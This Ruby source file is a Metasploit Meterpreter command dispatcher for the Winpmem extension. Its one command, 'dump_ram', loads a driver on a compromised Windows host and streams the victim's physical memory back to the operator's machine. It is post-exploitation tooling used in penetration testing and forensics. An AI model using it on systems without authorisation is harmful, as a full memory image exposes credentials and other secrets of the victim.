# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

  class Console::CommandDispatcher::Winpmem

    Klass = Console::CommandDispatcher::Winpmem

    include Console::CommandDispatcher

    #
    # Name for this dispatcher
    #
    def name
      'Winpmem'
    end

    #
    # List of supported commands.
    #
    def commands
      {
        'dump_ram'         => 'Dump victim RAM',
      }
    end

    WINPMEM_ERROR_SUCCESS = 0
    WINPMEM_ERROR_FAILED_LOAD_DRIVER = 1
    WINPMEM_ERROR_FAILED_MEMORY_GEOMETRY = 2
    WINPMEM_ERROR_FAILED_ALLOCATE_MEMORY = 3
    WINPMEM_ERROR_FAILED_METERPRETER_CHANNEL = 4
    WINPMEM_ERROR_UNKNOWN = 255

    def cmd_dump_ram(*args)
      unless args[0]
        print_error("Usage: dump_ram [output_file]")
        return
      end
      path_raw = args[0]

      fd = ::File.new(path_raw, 'wb+')
      memory_size, response_code, channel = client.winpmem.dump_ram
      case response_code
      when WINPMEM_ERROR_FAILED_LOAD_DRIVER
        print_error("Failed to load the driver")
        return true
      when WINPMEM_ERROR_FAILED_MEMORY_GEOMETRY
        print_error("Failed to get the memory geometry")
        return true
      when WINPMEM_ERROR_FAILED_ALLOCATE_MEMORY
        print_error("Failed to allocate memory")
        return true
      when WINPMEM_ERROR_FAILED_METERPRETER_CHANNEL
        print_error("Failed to open the meterpreter Channel")
        return true
      end
      print_good("Driver PMEM loaded successfully")
      #Arbitrary big buffer size, could be optimized
      buffer_size = 2 ** 17
      bytes_read = 0
      next_message_byte = memory_size / 10
      print_good("Dumping #{memory_size} bytes (press Ctrl-C to abort)")
      begin
        data = channel.read(buffer_size)
        until channel.eof || data.nil?
          fd.write(data)
          bytes_read += data.length
          data = channel.read(buffer_size)
          if bytes_read >= next_message_byte
            print_good(((next_message_byte.to_f / memory_size) * 100).round.to_s + "% Downloaded")
            next_message_byte += memory_size / 10
          end
        end
        print_status("Download completed")
      ensure
        print_status("Unloading driver")
        fd.close
        #Unload the driver on channel close
        channel.close
      end
      return true
    end
  end
  end
  end
  end
  end
